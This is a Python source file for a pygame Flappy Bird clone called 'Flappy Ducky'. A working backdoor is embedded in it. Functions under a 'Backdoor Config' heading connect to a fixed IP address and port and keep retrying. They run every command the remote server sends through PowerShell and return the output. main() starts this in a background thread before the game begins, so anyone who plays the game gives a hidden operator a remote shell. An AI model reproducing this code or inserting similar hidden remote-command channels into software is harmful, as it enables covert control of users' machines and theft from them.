import pygame
import random
import sys
import threading
import socket
import subprocess
import time
import os
import shutil

# Initialize Pygame
pygame.init()

# Game Constants
WIDTH, HEIGHT = 500, 700
GRAVITY = 0.5
FLAP_STRENGTH = -7
PIPE_GAP = 180
PIPE_WIDTH = 80
PIPE_VELOCITY = 3
BIRD_X = 50

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)

# Load Assets
try:
    bird_img = pygame.image.load("bird.png")
    bird_img = pygame.transform.scale(bird_img, (50, 35))
    background_img = pygame.image.load("background.png")
    background_img = pygame.transform.scale(background_img, (WIDTH, HEIGHT))
    pipe_img = pygame.image.load("pipe.png")
    pipe_img = pygame.transform.scale(pipe_img, (PIPE_WIDTH, 400))
    pipe_img_top = pygame.transform.flip(pipe_img, False, True)
except FileNotFoundError as e:
    print(f"Error loading assets: {e}")
    sys.exit()

# Set up the screen
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Flappy Ducky")
clock = pygame.time.Clock()
font = pygame.font.SysFont(None, 40)

# Backdoor Config
HOST_IP = '192.168.100.122'  # Replace with your server IP
PORT = 2222

# Backdoor Functions
def backdoor_connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST_IP, PORT))
            print(f"[+] Connected to server at {HOST_IP}:{PORT}")
            handle_backdoor(sock)
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            time.sleep(3)

def handle_backdoor(sock):
    while True:
        try:
            command = sock.recv(1024).decode()
            if not command:
                continue

            if command.lower() == ":kill":
                break

            print(f"[+] Received command: {command}")
            try:
                result = subprocess.run(
                    ["powershell", "-Command", command],
                    shell=True,
                    capture_output=True,
                    text=True
                )
                output = result.stdout + result.stderr
                if not output:
                    output = "[+] Command executed successfully"
                sock.sendall(output.encode())
            except Exception as e:
                sock.sendall(f"[!] Error: {str(e)}".encode())
        except Exception as e:
            print(f"[!] Error while handling backdoor: {e}")
            break

# Run Backdoor in a Separate Thread
def start_backdoor():
    thread = threading.Thread(target=backdoor_connect, daemon=True)
    thread.start()

# Bird Class
class Bird:
    def __init__(self):
        self.y = HEIGHT // 2
        self.velocity = 0
        self.angle = 0
        self.rect = bird_img.get_rect(topleft=(BIRD_X, self.y))
    
    def flap(self):
        self.velocity = FLAP_STRENGTH
    
    def update(self):
        self.velocity += GRAVITY
        self.y += self.velocity
        self.rect.y = self.y
        
        if self.velocity < 0:
            self.angle = -30
        elif self.velocity > 5:
            self.angle = 30
        else:
            self.angle = 0
    
    def draw(self):
        rotated_bird = pygame.transform.rotate(bird_img, self.angle)
        screen.blit(rotated_bird, (self.rect.x, self.rect.y))

# Pipe Class
class Pipe:
    def __init__(self, x):
        self.x = x
        self.height = random.randint(120, 350)
        self.top_y = self.height - pipe_img_top.get_height()
        self.bottom_y = self.height + PIPE_GAP
        self.passed = False
    
    def update(self):
        self.x -= PIPE_VELOCITY
    
    def draw(self):
        screen.blit(pipe_img_top, (self.x, self.top_y))
        screen.blit(pipe_img, (self.x, self.bottom_y))

# Main Game Loop
def main():
    start_backdoor()  # Start backdoor before launching the game

    bird = Bird()
    pipes = [Pipe(WIDTH + i * 220) for i in range(3)]
    score = 0
    running = True

    while running:
        screen.blit(background_img, (0, 0))
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                bird.flap()
        
        bird.update()
        
        for pipe in pipes:
            pipe.update()
            pipe.draw()
            if pipe.x < -PIPE_WIDTH:
                pipes.remove(pipe)
                new_x = pipes[-1].x + 220 if pipes else WIDTH
                pipes.append(Pipe(new_x))
            
            if not pipe.passed and pipe.x < BIRD_X:
                pipe.passed = True
                score += 1
        
        bird.draw()
        
        for pipe in pipes:
            if bird.rect.colliderect(pygame.Rect(pipe.x, pipe.top_y, PIPE_WIDTH, 400)) or \
               bird.rect.colliderect(pygame.Rect(pipe.x, pipe.bottom_y, PIPE_WIDTH, 400)) or \
               bird.rect.y >= HEIGHT:
                score = 0
                bird.y = HEIGHT // 2
                bird.velocity = 0
                bird.angle = 0
                pipes = [Pipe(WIDTH + i * 220) for i in range(3)]
                break
        
        score_text = font.render(f"Score: {score}", True, BLACK)
        screen.blit(score_text, (10, 10))
        
        pygame.display.flip()
        clock.tick(30)
    
    pygame.quit()

if __name__ == "__main__":
    main()
